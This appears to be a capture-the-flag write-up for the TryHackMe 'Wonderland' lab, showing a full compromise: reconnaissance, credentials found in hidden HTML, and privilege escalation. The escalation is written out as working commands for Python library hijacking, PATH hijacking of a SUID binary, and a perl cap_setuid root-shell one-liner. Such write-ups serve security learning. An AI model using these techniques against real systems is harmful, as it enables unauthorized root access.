# Wonderland — TryHackMe — Medium

> **Date:** 2026-05-30\
> **Platform:** TryHackMe\
> **Difficulty:** Medium\
> **Tags:** `#linux` `#web` `#python` `#library-hijacking` `#path-hijacking` `#capabilities` `#privesc`

---

## Summary

Linux machine themed around Alice in Wonderland. Initial access obtained via credentials hidden in an HTML comment after following a hidden directory path. Privilege escalation involved three steps: Python library hijacking to become rabbit, PATH hijacking via a SUID binary to become hatter, and Linux capabilities abuse on perl to gain root.

---

## Reconnaissance

### Nmap scan

```bash
nmap -sC -sV -oN wonderland.txt 10.114.179.126
```

Open ports:

- 22: SSH OpenSSH 7.6p1 Ubuntu
- 80: HTTP Golang net/http server

---

## Enumeration

### Directory bruteforce

```bash
gobuster dir -u http://10.114.179.126 -w /usr/share/wordlists/dirb/common.txt
# Found: /r -> hint: "Keep Going"
```

Full path: `http://10.114.179.126/r/a/b/b/i/t`

### Credentials in HTML source

```bash
curl http://10.114.179.126/r/a/b/b/i/t
```

Hidden HTML element:

```html
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

Credentials:

- Username: `alice`
- Password: `HowDothTheLittleCrocodileImproveHisShiningTail`

---

## Initial Access

```bash
ssh alice@10.114.179.126
```

Result: Shell as alice

---

## Privilege Escalation

### Step 1 - alice to rabbit (Python Library Hijacking)

```bash
sudo -l
```

Allowed command:

```text
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The script imports `random`. Created a malicious `random.py` in the same directory:

```bash
printf 'import os\nos.system("/bin/bash")\n' > /home/alice/random.py
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Result: Shell as rabbit

### Step 2 - rabbit to hatter (PATH Hijacking)

```bash
cd /home/rabbit
ls -l teaParty
ltrace ./teaParty
```

`teaParty` is a SUID binary that calls `date` without an absolute path.

```bash
cd /tmp
printf '#!/bin/sh\n/bin/bash\n' > date
chmod +x date
export PATH=/tmp:$PATH
/home/rabbit/teaParty
```

Result: Shell as `hatter`. Password found: `WhyIsARavenLikeAWritingDesk?`

### Step 3 - hatter to root (Linux Capabilities)

```bash
getcap -r / 2>/dev/null
# /usr/bin/perl = cap_setuid+ep
```

Opened a fresh SSH session as `hatter`, then ran the capability-enabled Perl binary:

```bash
ssh hatter@10.114.179.126
# Password: WhyIsARavenLikeAWritingDesk?
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

Result: Root shell

---

## Flags

Note: Flags are INVERTED on this machine!

User flag (in `/root/`): `THM{REDACTED}`

Root flag (in `/home/alice/`): `THM{REDACTED}`

---

## Lessons Learned

**1.** Hidden directory paths can encode hints in the URL itself — always enumerate recursively and follow thematic clues like "Follow the white rabbit" → `/r/a/b/b/i/t`.

**2.** Python library hijacking is a powerful technique — when a script runs `import random` and you can write to the same directory, creating a malicious `random.py` overrides the real module.

**3.** Linux capabilities like `cap_setuid` on perl are as dangerous as SUID bits — always run `getcap -r / 2>/dev/null` during privesc enumeration.

---

## Attack Chain Summary

```text
nmap -> HTTP + SSH -> gobuster -> /r/a/b/b/i/t
-> source HTML -> alice credentials -> SSH alice
-> sudo Python as rabbit -> library hijacking (random.py) -> rabbit
-> teaParty SUID -> PATH hijacking -> hatter
-> getcap -> Perl cap_setuid -> root
```

---

## References

- TryHackMe - Wonderland: https://tryhackme.com/room/wonderland
- HackTricks Python Library Hijacking: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#python-library-hijacking
- HackTricks Linux Capabilities: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
- GTFOBins perl: https://gtfobins.github.io/gtfobins/perl/
